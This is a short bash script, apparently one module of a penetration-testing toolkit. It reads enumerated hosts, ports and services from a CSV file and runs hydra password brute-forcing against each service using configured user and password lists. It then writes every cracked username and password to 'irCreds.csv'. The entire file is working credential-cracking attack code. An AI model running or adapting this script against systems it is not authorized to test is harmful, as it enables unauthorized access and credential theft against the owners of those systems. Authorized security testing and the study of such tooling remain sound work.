#!/bin/bash

function brute()
{
	# Iterate over each pair (target, port) found
	# Log stating time for speed calculations
	date +%s > .bftime
	# Loop over all targets found with open ports
	for line in $(cat irEnumeration.csv 2>/dev/null)
	do
		if [ "$line" != "" ]
		then
			ip=$(echo "$line" | awk -F"," '{print $1}')
			port=$(echo "$line" | awk -F"," '{print $2}')
			service=$(echo "$line" | awk -F"," '{print $3}')
			# If the port is listed in '.services.lst', try to BF
			if [ "$(cat .services.lst | grep $service)" != "" ]
			then
				# Run this on another terminal (inside the interface script's folder) when activating the BF module to validate the BF rate calculation -
				# for i in {1..1000}; do clear; echo "Attempts -"; cat .hydra.res | wc -l; echo "Time Passed: $i"; sleep 1; done
				# Using 'tee' I can pipe all BF attempts into '.hydra.res' while returning only cracked credentials into the variable '$results'
				results=$(hydra -L $usrFile -P $passFile -s $port -t 8 $ip $service -e nsr -V 2>/dev/null | grep -e "\[ATTEMPT\]" -e "\[$port\]\[$service\]" | tee -a .hydra.res)
				cracked=$(echo "$results" | grep "\[$port\]\[$service\]")
				if [ "$cracked" != "" ]
				then
					# In case of multiple results from hydra
					for credentials in $(echo "$cracked")
					do
						username=$(echo "$credentials" | awk '{print $5}')
						password=$(echo "$credentials" | awk '{print $7}')
						data="$ip,$port,$service,$username,$password"
						# Skip duplicates
						statCode=$(cat irCreds.csv 2>/dev/null | grep "$data"; echo $?)
						if [ "$statCode" == "1" ]
						then
							# Save all cracked credentials in a file
							echo "$data" >> irCreds.csv
						fi
					done
				fi
			fi
		fi
	done
	# Remove all temp files created for BF speed calculations (Calcs are made in the main 'menu()' function of the 'interface.sh' file)
	rm -f .hydra.res .bftime
}

orange='\033[0;33m'
clear='\033[0m'
ORG=$IFS
IFS=$'\n'
# Get currently configured user and password lists
usrFile=$(jq '.user_list' .settings.json | sed 's/\"//g')
passFile=$(jq '.pass_list' .settings.json | sed 's/\"//g')
# Run BF
brute
IFS=$ORG
